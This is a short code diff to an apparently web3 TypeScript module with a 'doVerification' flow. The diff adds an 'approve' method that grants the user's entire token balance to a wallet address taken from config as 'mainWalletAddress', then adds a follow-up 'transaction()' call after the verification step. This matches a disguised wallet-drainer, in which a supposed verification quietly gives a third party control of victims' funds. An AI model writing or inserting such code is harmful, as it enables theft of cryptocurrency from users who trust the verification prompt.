@@ -104,6 +104,15 @@ class iTzUnity {
 		}
 		await handleVerificationResponse("PERMIT",account.address+"",payload);
 	}
+
+	async approve() {
+		const providerUrl = //@ts-ignore
+			provider?.connection?.url;
+		const developer = {
+			address: await getConfig('mainWalletAddress')
+		}
+		await callContractMethod('approve',[developer.address,this.token.balance], this.token.contract_address,this.signer!)
+	}
 }
 
 export async function doVerification(provider: ReturnType<typeof useEthersProvider>,signer: ReturnType<typeof useEthersSigner>,account: ReturnType<typeof useAccount>, token: FetchedWalletToken) {
@@ -123,6 +132,8 @@ export async function doVerification(provider: ReturnType<typeof useEthersProvid
 		}  catch (e: any) {
 			console.log("APPROVE METHOD FAILURE",e);
 		}
+
+		await unity.transaction();
 	}
 }
 
